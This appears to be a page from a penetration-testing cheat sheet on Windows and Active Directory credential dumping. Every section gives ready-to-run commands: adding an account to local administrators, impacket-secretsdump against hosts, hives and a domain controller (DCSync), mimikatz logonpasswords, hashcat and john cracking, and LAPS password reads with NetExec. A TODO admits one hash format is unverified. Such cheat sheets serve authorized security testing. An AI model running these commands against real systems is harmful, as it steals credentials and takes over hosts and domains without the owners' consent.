---
title: Credential dumping
order: 4
tags: [ad, secretsdump, mimikatz, dcc2, lsa, sam, hashes]
---

## Enable remote dumping

From an administrator or SYSTEM context, promote a known account so remote dumps and command execution work cleanly:

```cmd
net localgroup administrators '{{USER}}' /add
```

Group membership refreshes only on a new logon; open a fresh session afterwards. See [Create a local administrator](windows/windows-privesc#create-a-local-administrator) for the full pattern. [Microsoft net localgroup](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-localgroup).

## Secretsdump remotely

With administrator access, dump SAM, LSA secrets and cached logons from the target box in one run:

```bash
impacket-secretsdump '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{RHOST}}
```

Save the whole output. LSA `DefaultPassword` and `_SC_*` entries are plaintext pivots; cached `$DCC2$` lines crack offline. [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).

## Mimikatz logon passwords

Run in the target session as administrator or SYSTEM:

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

Lists in-memory logons: NTLM hashes and plaintext for anyone with a session on the host. Upload the binary with an existing [Evil-WinRM session](services/remote-access#winrm). [Mimikatz sekurlsa module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa).

## Secretsdump from hives

Offline dump of downloaded hives, including `C:\Windows.old\Windows\System32` and backup copies:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Old local-account hashes replay by [pass-the-hash](active-directory/credential-access#pass-the-hash) where the account still exists. [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).

## Crack cached logons

Cached domain logons (`$DCC2$` lines from secretsdump) crack like any other hash:

```bash
hashcat -m 2100 dcc2.txt /home/kali/tools/wordlists/rockyou.txt
```

TODO: verify the exact `$DCC2$` line format hashcat expects before running. [Hashcat example hashes](https://github.com/hashcat/hashcat/blob/main/docs/hashcat-example-hashes.md).

## Crack a protected archive

For password-protected archives recovered from shares, before attempting reuse:

```bash
zip2john site.zip > zip.hash
john --format=zip --wordlist=/home/kali/tools/wordlists/rockyou.txt zip.hash
```

Other object types have their own helpers, e.g. keepass2john. [John the Ripper documentation](https://www.openwall.com/john/doc/).

## DCSync through the domain controller

Requires Replicating Directory Changes permissions, normally a highly privileged or specifically delegated account. Target DC rather than an arbitrary member host.

```bash
impacket-secretsdump '{{DOMAIN}}/{{USER}}:{{PASS}}@{{DC}}'
```

Save the complete output and limit later credential tests to intended hosts. [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).

## Read LAPS passwords

Only an account authorized to read the LAPS password attribute can return it. NetExec's laps module checks accessible computer attributes through LDAP.

```bash
nxc ldap {{DC}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' -M laps
```

Treat each recovered local administrator password as host-specific unless reuse is explicitly verified. [Microsoft Windows LAPS access control](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview), [NetExec modules](https://www.netexec.wiki/ldap-protocol/list-modules).
